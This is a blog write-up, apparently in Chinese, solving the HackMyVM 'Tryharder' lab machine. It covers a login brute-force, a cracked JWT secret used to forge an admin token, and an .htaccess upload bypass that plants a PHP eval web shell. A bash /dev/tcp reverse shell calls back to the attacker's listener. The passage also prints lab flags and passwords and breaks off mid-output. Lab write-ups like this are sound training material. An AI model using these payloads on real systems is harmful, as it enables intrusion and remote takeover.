{"pageProps":{"postData":{"id":"HackMyVMTryharder","contentHtml":"<h1>Tryharder.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Tryharder\">https://hackmyvm.eu/machines/machine.php?vm=Tryharder</a></p>\n</blockquote>\n<p>Notes：<strong>Hello Hacker! Try Harder!</strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/tryharder  nmap -sP 192.168.56.0/24\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-11 09:23 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00033s latency).\nMAC Address: 08:00:27:88:A0:3E (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.41\nHost is up (0.00054s latency).\nMAC Address: 08:00:27:D9:92:F7 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.4\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (3 hosts up) scanned <span class=\"hljs-keyword\">in</span> 15.09 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/tryharder  nmap -sT -min-rate 10000 -p- 192.168.56.41       \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-11 09:34 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.41\nHost is up (0.00062s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:D9:92:F7 (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 10.32 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/tryharder  nmap -sT -A -T4 -O -p 22,80 192.168.56.41        \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-11 09:35 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.41\nHost is up (0.00059s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey: \n|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)\n|   256 1e:a7:44:0b:2c:1b:0d:77:83:<span class=\"hljs-built_in\">df</span>:1d:9f:0e:30:08:4d (ECDSA)\n|_  256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)\n80/tcp open  http    Apache httpd 2.4.59 ((Debian))\n|_http-server-header: Apache/2.4.59 (Debian)\n|_http-title: \\xE8\\xA5\\xBF\\xE6\\xBA\\xAA\\xE6\\xB9\\x96\\xE7\\xA7\\x91\\xE6\\x8A\\x80 - \\xE4\\xBC\\x81\\xE4\\xB8\\x9A\\xE9\\x97\\xA8\\xE6\\x88\\xB7\\xE7\\xBD\\x91\\xE7\\xAB\\x99\nMAC Address: 08:00:27:D9:92:F7 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.59 ms 192.168.56.41\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 15.36 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/tryharder  nmap -script=vuln 22,80 192.168.56.41    \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-11 09:35 EDT\nFailed to resolve <span class=\"hljs-string\">\"22,80\"</span>.\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.41\nHost is up (0.00018s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n|_http-csrf: Couldn'</span>t find any CSRF vulnerabilities.\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\nMAC Address: 08:00:27:D9:92:F7 (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 37.97 seconds\n</span></code></pre>\n<h2>Web 渗透</h2>\n<h3>信息收集</h3>\n<p>访问 HTTP，一个静态页面，什么内容都没有</p>\n<p><img src=\"/post-images/HackMyVMTryharder/image.png\" alt=\"image.png\"></p>\n<p>目录扫描无结果</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/tryharder  gobuster <span class=\"hljs-built_in\">dir</span> -u http://192.168.56.41 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,502,429 --no-error          \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.41\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404,403,502,429\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\nProgress: 220560 / 220561 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>查看一下页面源码，找到如下信息</p>\n<pre><code class=\"hljs language-bash\">171 /* 调试信息：API路径 /NzQyMjE= */\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/tryharder  <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"NzQyMjE=\"</span> | <span class=\"hljs-built_in\">base64</span> -d \n74221#  \n</code></pre>\n<p>访问 [<code>/](http://192.168.56.41/74221/)74221</code></p>\n<p><img src=\"/post-images/HackMyVMTryharder/image1.png\" alt=\"image.png\"></p>\n<p>扫描一下目录</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/tryharder  gobuster <span class=\"hljs-built_in\">dir</span> -u http://192.168.56.41/74221 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,502,429 --no-error\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.41/74221\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   403,502,429,404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/uploads              (Status: 301) [Size: 322] [--> http://192.168.56.41/74221/uploads/]\nProgress: 220560 / 220561 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>访问<code>uploads</code>文件夹，最后能到，没什么信息</p>\n<p><img src=\"/post-images/HackMyVMTryharder/image2.png\" alt=\"image.png\"></p>\n<p>爆破登录页，爆破得出账号密码<code>test:123456</code></p>\n<p><img src=\"/post-images/HackMyVMTryharder/image3.png\" alt=\"image.png\"></p>\n<p>进入后台</p>\n<p><img src=\"/post-images/HackMyVMTryharder/image4.png\" alt=\"image.png\"></p>\n<h3>JWT</h3>\n<p>看来权限要达到<code>admin</code> ，抓个包看看，是<code>JWT</code></p>\n<pre><code class=\"hljs language-bash\">GET /74221/dashboard.php HTTP/1.1\nHost: 192.168.56.41\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://192.168.56.41/74221/\nConnection: keep-alive\nCookie: jwt_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciIsImV4cCI6MTc0NDM4NTM5N30._HNKBOpExcKvCawhRMm8mWsZaVJCAQkqNgRo1xJbjSA\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\n</code></pre>\n<p>解析一下，应该是要将<code>role</code>改为<code>admin</code></p>\n<p><img src=\"/post-images/HackMyVMTryharder/image5.png\" alt=\"image.png\"></p>\n<p>尝试爆破<code>JWT key</code> ,爆破得到 <code>jwtsecret123</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/tryharder  john --wordlist=../../Dict/SecLists-2024.3/Passwords/scraped-JWT-secrets.txt jwt               \nUsing default input encoding: UTF-8\nLoaded 1 password <span class=\"hljs-built_in\">hash</span> (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])\nNo password hashes left to crack (see FAQ)\n ⚡ root@kali  ~/Desktop/test/tryharder  john --show jwt                                                                 \n?:jwtsecret123\n\n1 password <span class=\"hljs-built_in\">hash</span> cracked, 0 left\n</code></pre>\n<p>JWT Sign ，注意<code>sub</code>要改为<code>999</code> ，不然上传功能使用不了</p>\n<p><img src=\"/post-images/HackMyVMTryharder/image6.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI5OTkiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3NDQzODUzOTcsImlhdCI6MTc0NDM4MzMxM30.Dz7IPxJs5CLA8EQhPGYVmLZkDA3RXNar9Y2HKZvVeWs\n</code></pre>\n<h3>文件上传利用</h3>\n<p>使用新的<code>JWT</code>进入后台有上传文件功能</p>\n<p><img src=\"/post-images/HackMyVMTryharder/image7.png\" alt=\"image.png\"></p>\n<p>上传PHP后缀文件提示：<code>Only .jpg and .png  files are allowed!</code></p>\n<p>上传<code>.htaccess</code> 进行绕过</p>\n<pre><code class=\"hljs language-bash\">Content-Disposition: form-data; name=<span class=\"hljs-string\">\"file\"</span>; filename=<span class=\"hljs-string\">\".htaccess\"</span>\nContent-Type: application/x-php\n\n&#x3C;IfModule mime_module>\n\tAddHandler php5-script .png          \n\tSetHandler application/x-httpd-php   \n&#x3C;/IfModule>\n</code></pre>\n<p>然后上传 <code>png</code>后缀的<code>php</code>文件</p>\n<pre><code class=\"hljs language-bash\">Content-Disposition: form-data; name=<span class=\"hljs-string\">\"file\"</span>; filename=<span class=\"hljs-string\">\"shell.png\"</span>\nContent-Type: application/x-php\n\n&#x3C;?php <span class=\"hljs-built_in\">eval</span>(<span class=\"hljs-variable\">$_POST</span>[1]);?>\n</code></pre>\n<p>上传成功给进行测试</p>\n<p><img src=\"/post-images/HackMyVMTryharder/image8.png\" alt=\"image.png\"></p>\n<p>进行反弹<code>shell</code> ，<code>Kali</code>开启监听</p>\n<pre><code class=\"hljs language-bash\">nc -lvp 1234\n</code></pre>\n<pre><code class=\"hljs language-bash\">1=system%28%22%2Fbin%2Fbash%20%2Dc%20%27bash%20%2Di%20%3E%26%2Fdev%2Ftcp%2F192%2E168%2E56%2E4%2F1234%200%3E%261%27%22%29%3B\n</code></pre>\n<pre><code class=\"hljs language-bash\">curl http://192.168.56.41/74221/uploads/999/shell.png -X POST -d <span class=\"hljs-string\">\"1=system%28%22%2Fbin%2Fbash%20%2Dc%20%27bash%20%2Di%20%3E%26%2Fdev%2Ftcp%2F192%2E168%2E56%2E4%2F1234%200%3E%261%27%22%29%3B\"</span>\n</code></pre>\n<p><img src=\"/post-images/HackMyVMTryharder/image9.png\" alt=\"image.png\"></p>\n<p>读取<code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">www-data@Tryharder:/home/pentester$ <span class=\"hljs-built_in\">cat</span> user.txt\n<span class=\"hljs-built_in\">cat</span> user.txt\nFlag{c4f9375f9834b4e7f0a528cc65c055702bf5f24a}\n</code></pre>\n<h2>提权</h2>\n<h3>提权 - pentester</h3>\n<p>先进行信息收集</p>\n<p>在 <code>/etc/passwd</code> 中找到些有趣的东西</p>\n<pre><code class=\"hljs language-bash\">pentester:x:1000:1000:Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness<span class=\"hljs-variable\">$itwastheepochofbelief</span>,itwastheepochofincredulity,&#x26;itwastheseasonofLight...:/home/pentester:/bin/bash\nxiix:x:1001:1001:A Tale of Two Cities:/home/xiix:/bin/bash\n</code></pre>\n<p>两个用户的描述为双城记的内容</p>\n<p><img src=\"/post-images/HackMyVMTryharder/image10.png\" alt=\"image.png\"></p>\n<p>在<code>pentester</code>家目录存在<code>.note</code> ，<code>Caesar</code>为凯撒，粉碎凯撒，可能指的是凯撒密码</p>\n<pre><code class=\"hljs language-bash\">www-data@Tryharder:/home/pentester$ <span class=\"hljs-built_in\">ls</span> -al\n<span class=\"hljs-built_in\">ls</span> -al\ntotal 28\ndrwxr-xr-x 2 pentester pentester 4096 Mar 25 06:46 .\ndrwxr-xr-x 4 root      root      4096 Mar 23 10:46 ..\nlrwxrwxrwx 1 root      root         9 Mar 22 08:03 .bash_history -> /dev/null\n-rw-r--r-- 1 pentester pentester  220 Apr 18  2019 .bash_logout\n-rw-r--r-- 1 pentester pentester 3526 Apr 18  2019 .bashrc\n-rw-r--r-- 1 root      root        58 Mar 25 02:13 .note\n-rw-r--r-- 1 pentester pentester  807 Apr 18  2019 .profile\n-rw-r--r-- 1 pentester pentester   47 Mar 23 07:08 user.txt\nwww-data@Tryharder:/home/pentester$ <span class=\"hljs-built_in\">cat</span> .note\n<span class=\"hljs-built_in\">cat</span> .note\nTwo cities clashed <span class=\"hljs-keyword\">in</span> tale: Smash Caesar, buddy, to pass.\n</code></pre>\n<p>提到了密码，那么应该要寻找隐藏文件</p>\n<pre><code class=\"hljs language-bash\">www-data@Tryharder:/tmp$ find / -name <span class=\"hljs-string\">'.*'</span> 2>/dev/null | awk <span class=\"hljs-string\">'!/^\\/sys/'</span>\nfind / -name <span class=\"hljs-string\">'.*'</span> 2>/dev/null | awk <span class=\"hljs-string\">'!/^\\/sys/'</span>\n/srv/...\n/var/www/html/74221/uploads/999/.htaccess\n/var/backups/.secret\n/var/backups/.secret/.verysecret\n/var/backups/.secret/.verysecret/.noooooo\n/home/pentester/.profile\n/home/pentester/.bashrc\n/home/pentester/.bash_logout\n/home/pentester/.note\n/home/pentester/.bash_history\n/home/xiix/.local\n/home/xiix/.profile\n/home/xiix/.bashrc\n/home/xiix/.bash_logout\n/home/xiix/.bash_history\n/run/network/.ifstate.lock\n/usr/src/linux-headers-4.19.0-27-amd64/.config\n/usr/src/linux-headers-4.19.0-27-amd64/.kernelvariables\n/etc/cron.daily/.placeholder\n/etc/cron.hourly/.placeholder\n/etc/cron.d/.placeholder\n/etc/cron.weekly/.placeholder\n/etc/cron.monthly/.placeholder\n/etc/skel/.profile\n/etc/skel/.bashrc\n/etc/skel/.bash_logout\n</code></pre>\n<p>/var/backups/.secret/.verysecret/.noooooo 下还能找到一个<code>note2.txt</code>文件，依旧是和双城记有关的内容。</p>\n<pre><code class=\"hljs language-bash\">www-data@Tryharder:/tmp$ <span class=\"hljs-built_in\">ls</span> /var/backups/.secret/.verysecret/.noooooo                                                                                        <span class=\"hljs-built_in\">ls</span> /var/backups/.secret/.verysecret/.noooooo                                                                                                                 \nnote2.txt  \n\nwww-data@Tryharder:/tmp$ <span class=\"hljs-built_in\">cat</span> /var/backups/.secret/.verysecret/.noooooo/note2.txt        \nThe Compass and the Campfire                                                                                                                                 \n\nDavid knelt beside his ten-year-old son, Jake, their shared backpack spilling onto the forest floor. <span class=\"hljs-string\">\"Lost?\"</span> Jake whispered, staring at the identical trees clawing at the twilight. David’s calloused fingers brushed the cracked compass <span class=\"hljs-keyword\">in</span> his palm—a relic from his father, its needle trembling like a moth. <span class=\"hljs-string\">\"Not lost,\"</span> he lied. <span class=\"hljs-string\">\"Just… rerouting.\"</span>        \n                                                                                                                                                             \nJake’s eyes narrowed, too sharp <span class=\"hljs-keyword\">for</span> comfort. <span class=\"hljs-string\">\"Your compass is broken.\"</span>        \n                                                                                                                                                             \nA chuckle escaped David, brittle as dry leaves. <span class=\"hljs-string\">\"Compasses don’t break, bud. They… forget.\"</span> He flipped it open, the glass fogged with age. <span class=\"hljs-string\">\"See? North isn’t \nwhere it should be. It’s where it chooses to be tonight.\"</span>                     \n                                                                                                                                                             \nThe boy frowned, <span class=\"hljs-keyword\">then</span> yelped as a pinecone thudded beside him. A red squirrel chattered overhead, its <span class=\"hljs-built_in\">tail</span> flicking like a metronome. Jake’s fear dissolved into giggles. David watched, throat tight. He’s still young enough to laugh at squirrels.                                                                     \n                                       \n<span class=\"hljs-string\">\"Dad?\"</span> Jake unzipped his jacket, revealing three granola bars and a glowstick. <span class=\"hljs-string\">\"We’ve got supplies. Let’s build a fort.\"</span>                                     \n                                       \nThey wove branches into a crooked shelter, Jake’s hands steady <span class=\"hljs-built_in\">where</span> David’s shook. When the first stars pierced the canopy, David confessed: <span class=\"hljs-string\">\"Grandpa gave me this compass the day I got lost in the mall. Told me it’d always point home.\"</span>                                                                              \n                                       \nJake snapped the glowstick, bathing their fort <span class=\"hljs-keyword\">in</span> alien green. <span class=\"hljs-string\">\"Does it work now?\"</span>                                                                           \n                                       \nThe needle quivered, settling northwest. Toward the distant highway hum, not their cabin’s woodsmoke. David closed the brass lid. <span class=\"hljs-string\">\"Nope. But you do.\"</span> He nodded at Jake’s pocket—<span class=\"hljs-built_in\">where</span> a crumpled trail map peeked out, dotted with the boy’s doodled dinosaurs.                                                          \n                                       \nDawn found them at the cabin’s porch, guided by Jake’s roars laughter and the squirrels he’d named <span class=\"hljs-string\">\"Sir Nibbles\"</span>. The compass stayed <span class=\"hljs-keyword\">in</span> David’s pocket, its secret safe: <span class=\"hljs-literal\">true</span> north had shifted years ago, anyway—from steel poles to a gap-toothed grin eating pancakes at 6 AM.           \n</code></pre>\n<p>还能扫描到存在<code>/srv/...</code> 文件</p>\n<pre><code class=\"hljs language-bash\">www-data@Tryharder:/tmp$ <span class=\"hljs-built_in\">cat</span> /srv/...\nIuwbtthfbetuoftimfs<span class=\"hljs-string\">\"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../\n</span></code></pre>\n<p>看着和用户<code>pentester</code> 描述很像，稍有一些字符不一样</p>\n<pre><code class=\"hljs language-bash\">Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness<span class=\"hljs-variable\">$itwastheepochofbelief</span>,itwastheepochofincredulity,&#x26;itwastheseasonofLight...\n</code></pre>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~/Desktop/test/tryharder  <span class=\"hljs-built_in\">cat</span> a.txt                  \nItwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness<span class=\"hljs-variable\">$itwastheepochofbelief</span>,itwastheepochofincredulity,&#x26;itwastheseasonofLight...\n ⚡ root@kali  ~/Desktop/test/tryharder  <span class=\"hljs-built_in\">cat</span> b.txt  \nIuwbtthfbetuoftimfs<span class=\"hljs-string\">\"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../\n</span></code></pre>\n<p>像是对比字符，相同为一个结果不相同为一个结果，这样就像是二进制数了</p>\n<p>编写脚本</p>\n<pre><code class=\"hljs language-bash\">s1 = <span class=\"hljs-string\">\"Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness<span class=\"hljs-variable\">$itwastheepochofbelief</span>,itwastheepochofincredulity,&#x26;itwastheseasonofLight...\"</span>\ns2 = <span class=\"hljs-string\">\"Iuwbtthfbetuoftimfs\\\"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../\"</span>\n\nresult = <span class=\"hljs-string\">\"\"</span>.<span class=\"hljs-built_in\">join</span>(<span class=\"hljs-string\">\"0\"</span> <span class=\"hljs-keyword\">if</span> ch1 == ch2 <span class=\"hljs-keyword\">else</span> <span class=\"hljs-string\">\"1\"</span> <span class=\"hljs-keyword\">for</span> ch1, ch2 <span class=\"hljs-keyword\">in</span> zip(s1, s2))\n<span class=\"hljs-built_in\">print</span>(result)\n</code></pre>\n<p>结果为</p>\n<pre><code class=\"hljs language-bash\">0101100100110000010101010101111100110101010011010011010001010011010010000011001101000100010111110011000100110111010111110011100001010101010001000100010001011001\n</code></pre>\n<p>将结果转换为十进制得到</p>\n<pre><code class=\"hljs language-bash\">Y0U_5M4SH3D_17_8UDDY\n</code></pre>\n<p>进行SSH登录</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/tryharder  ssh pentester@192.168.56.41 \nThe authenticity of host <span class=\"hljs-string\">'192.168.56.41 (192.168.56.41)'</span> can<span class=\"hljs-string\">'t be established.\nED25519 key fingerprint is SHA256:rXcjV9xeZG+J6KZLTr1t2Xi2ErBvMauXjxH4EBvhV0c.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:39: [hashed name]\n    ~/.ssh/known_hosts:41: [hashed name]\n    ~/.ssh/known_hosts:42: [hashed name]\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '</span>192.168.56.41<span class=\"hljs-string\">' (ED25519) to the list of known hosts.\npentester@Tryharder:~$ \n</span></code></pre>\n<h3>提权 - xiix</h3>\n<p>查看<code>sudo</code>权限，貌似可以进行提权</p>\n<pre><code class=\"hljs language-bash\">pentester@Tryharder:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> pentester on tryharder:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser pentester may run the following commands on tryharder:\n    (ALL : ALL) NOPASSWD: /usr/bin/find\n\n</code></pre>\n<pre><code class=\"hljs language-bash\">pentester@Tryharder:~$ <span class=\"hljs-built_in\">sudo</span> find . -<span class=\"hljs-built_in\">exec</span> /bin/sh \\; -quit\nfind: critical error - Segmentation fault (core dumped)\n</code></pre>\n<p>无法拿来进行提权，估计是被修改过的，难道是要我们使用其来寻找一些文件么？</p>\n<pre><code class=\"hljs language-bash\">pentester@Tryharder:~$ <span class=\"hljs-built_in\">sudo</span> find /root -name <span class=\"hljs-string\">'*'</span>\n/root\n/root/congrats.txt\n/root/.local\n/root/.local/share\n/root/.local/share/nano\n/root/root.txt\n/root/.profile\n/root/.bashrc\n/root/1.c\n/root/.Xauthority\n/root/.bash_history\n</code></pre>\n<p>上传<code>linpeas</code>进行扫描，<code>xiix</code>运行着<code>/srv/backdoor.py</code></p>\n<pre><code class=\"hljs language-bash\">-syslog-only                                                                                                                                                 \n  └─(Caps) 0x0000000020000000=cap_audit_write                                                                                                                \nroot       377  0.1  0.6  19304  6228 ?        Ss   22:05   0:03 /lib/systemd/systemd-logind                                                                 \nroot       381  0.0  0.2   8824  2940 ?        Ss   22:05   0:00 /usr/sbin/cron -f                                                                           \nroot       435  0.0  0.2   9796  2640 ?        S    22:06   0:00  _ /usr/sbin/CRON -f                                                                        \nxiix       436  0.0  0.0   2384   644 ?        Ss   22:06   0:00      _ /bin/sh -c /srv/backdoor.py                                                          \nxiix       437  0.0  0.8  19260  8432 ?        S    22:06   0:00          _ python /srv/backdoor.py                                                          \nroot       387  0.0  0.1   5608  1480 tty1     Ss+  22:05   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux    \n</code></pre>\n<p>但是我么没有权限查看</p>\n<pre><code class=\"hljs language-bash\">pentester@Tryharder:/srv$ <span class=\"hljs-built_in\">ls</span> -al backdoor.py \n-rwx------ 1 xiix xiix 1012 Mar 23 23:42 backdoor.py\n</code></pre>\n<p>查看一下端口，存在一个本地访问的<code>8989</code>端口</p>\n<pre><code class=\"hljs language-bash\">pentester@Tryharder:/srv$ ss -tulpn\nNetid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   \nudp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                      \ntcp                     LISTEN                   0                        128                                              0.0.0.0:22                                              0.0.0.0:*                      \ntcp                     LISTEN                   0                        5                                              127.0.0.1:8989                                            0.0.0.0:*                      \ntcp                     LISTEN                   0                        128                                                    *:80                                                    *:*                      \ntcp                     LISTEN                   0                        128                                                 [::]:22                                                 [::]:*   \n</code></pre>\n<p>访问后提示输入密码</p>\n<pre><code class=\"hljs language-bash\">pentester@Tryharder:/srv$ nc 127.0.0.1 8989\nEnter password: 1\nAccess denied!\n</code></pre>\n<p>尝试输入之前获得的密码后得到一个shell，并且权限是<code>xiix</code> 用户的</p>\n<pre><code class=\"hljs language-bash\">pentester@Tryharder:/srv$ nc 127.0.0.1 8989\nEnter password: Y0U_5M4SH3D_17_8UDDY\nAccess granted!\nshell> <span class=\"hljs-built_in\">id</span>\nuid=1001(xiix) gid=1001(xiix) <span class=\"hljs-built_in\">groups</span>=1001(xiix)\n\nshell> \n</code></pre>\n<p>写入公钥</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"xxxx\"</span> > .ssh/authorized_keys\n</code></pre>\n<p>使用<code>SSH</code>登录</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  ssh xiix@192.168.56.41   \nLinux Tryharder 4.19.0-12-amd64 <span class=\"hljs-comment\">#1 SMP Debian 4.19.152-1 (2020-10-18) x86_64</span>\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms <span class=\"hljs-keyword\">for</span> each program are described <span class=\"hljs-keyword\">in</span> the\nindividual files <span class=\"hljs-keyword\">in</span> /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nxiix@Tryharder:~$ \n</code></pre>\n<h3>提权 - root</h3>\n<p><code>xiix</code>家目录下有一个可执行文件<code>guess_game</code> ，文件所属者是<code>xiix</code>但是没有任何办法进行更改权限，估计是使用<code>lsattr</code> 限制了</p>\n<pre><code class=\"hljs language-bash\">xiix@Tryharder:~$ ./guess_game \n===== 终极运气挑战 / Ultimate Luck Challenge ====\n规则很简单： 我心里有个数字（0-99），你有一次机会猜。\nI have a number (0-99), you get one guess.\n猜对了，我就把属于你的东西给你；猜错了？嘿嘿，后果自负！\nGuess right, I’ll give your reward; wrong? Hehe, face the consequences!\n提示： 聪明人也许能找到捷径。\nHint: Smart ones might find a shortcut.\n输入你的猜测（0-99） / Your guess (0-99): ^C\n</code></pre>\n<p>貌似很危险..提示说有捷径，我直接执行</p>\n<pre><code class=\"hljs language-bash\">xiix@Tryharder:~$ ./guess_game \n===== 终极运气挑战 / Ultimate Luck Challenge ====\n规则很简单： 我心里有个数字（0-99），你有一次机会猜。\nI have a number (0-99), you get one guess.\n猜对了，我就把属于你的东西给你；猜错了？嘿嘿，后果自负！\nGuess right, I’ll give your reward; wrong? Hehe, face the consequences!\n提示： 聪明人也许能找到捷径。\nHint: Smart ones might find a shortcut.\n输入你的猜测（0-99） / Your guess (0-99): 1\n哈哈，猜错了！ / Wrong guess!\n秘密数字是 34。 / Secret number: 34\n正在格式化你的硬盘...（开玩笑的啦！） / Formatting disk... (Kidding!)\n\nxiix@Tryharder:~$ ./guess_game \n===== 终极运气挑战 / Ultimate Luck Challenge ====\n规则很简单： 我心里有个数字（0-99），你有一次机会猜。\nI have a number (0-99), you get one guess.\n猜对了，我就把属于你的东西给你；猜错了？嘿嘿，后果自负！\nGuess right, I’ll give your reward; wrong? Hehe, face the consequences!\n提示： 聪明人也许能找到捷径。\nHint: Smart ones might find a shortcut.\n输入你的猜测（0-99） / Your guess (0-99): 2\n哈哈，猜错了！ / Wrong guess!\n秘密数字是 20。 / Secret number: 20\n正在格式化你的硬盘...（开玩笑的啦！） / Formatting disk... (Kidding!)\n</code></pre>\n<p>貌似不会做什么，并且每次数字不一样，直接暴力破解</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(<span class=\"hljs-built_in\">seq</span> 10000);<span class=\"hljs-keyword\">do</span> <span class=\"hljs-built_in\">echo</span> 1|./guess_game ;<span class=\"hljs-keyword\">done</span>\n</code></pre>\n<p>爆破出密码<code>superxiix</code></p>\n<pre><code class=\"hljs language-bash\">===== 终极运气挑战 / Ultimate Luck Challenge ====\n规则很简单： 我心里有个数字（0-99），你有一次机会猜。\nI have a number (0-99), you get one guess.\n猜对了，我就把属于你的东西给你；猜错了？嘿嘿，后果自负！\nGuess right, I’ll give your reward; wrong? Hehe, face the consequences!\n提示： 聪明人也许能找到捷径。\nHint: Smart ones might find a shortcut.\n天哪！你居然猜对了！运气逆天啊！ / You got it! Amazing luck!\nPass: 